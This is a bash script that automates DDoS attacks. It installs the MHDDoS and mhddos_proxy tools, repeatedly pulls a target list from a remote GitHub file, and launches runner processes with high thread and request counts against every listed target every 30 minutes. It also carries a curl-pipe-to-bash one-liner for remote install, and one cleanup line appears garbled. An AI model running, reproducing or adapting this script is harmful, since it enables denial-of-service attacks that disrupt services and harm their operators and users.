#!/bin/bash
# curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/bash/test.sh | bash

usage() {
cat << EOF
usage: ./auto_bash.sh [-t|-r|--table]
                        [-t THREADS]      (default = 1000)
                        [-r RPC]          (default = 2000)
                        [--table]         (default = off)
                        [-h]              show this menu
EOF
}

startddos () {
# Install git, python3, pip, mhddos_proxy, MHDDoS and updated proxy list.
sudo apt update -qq -y
sudo apt install git python3 python3-pip -qq -y
# for some virtual cloud systems based on debian (like GC)
sudo apt install gcc libc-dev libffi-dev libssl-dev python3-dev rustc -qq -y 
sudo pip install --upgrade pip

cd ~
sudo rm -r mhddos_proxy-n 10
git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
python3 -m pip install -r ~/mhddos_proxy/requirements.txt
cd mhddos_proxy
git clone https://github.com/MHProDev/MHDDoS.git
  
while true
do
   pkill -f start.py; pkill -f runner.py 
   # Get number of targets. Sometimes list_size = 0 (network or github problem). So here is check to avoid script error.
   list_size=$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/bash/tg_test | cat | grep "^[^#]" | wc -l)
   while [[ $list_size = "0"  ]]
      do
            sleep 5
            list_size=$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/bash/tg_test | cat | grep "^[^#]" | wc -l)
      done
   for (( i=1; i<=list_size; i++ ))
      do
            cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/bash/tg_test  | cat | grep "^[^#]")")
            python3 ~/mhddos_proxy/runner.py $cmd_line $threads $rpc $debug $table&
      done
sleep 30m
done
}

threads="-t 1000"
rpc="--rpc 2000"
debug="--debug"
table=""

while [ "$1" != "" ]; do
    case $1 in
      -t | --threads )   threads="-t $2"; shift 2;;
      -r | --rpc )    rpc="--rpc $2";  shift 2  ;;
      -h | --help )      usage;   exit  ;;
      --table )   table="--table"; shift ;;
      * )                usage    exit 1
    esac
done

startddos
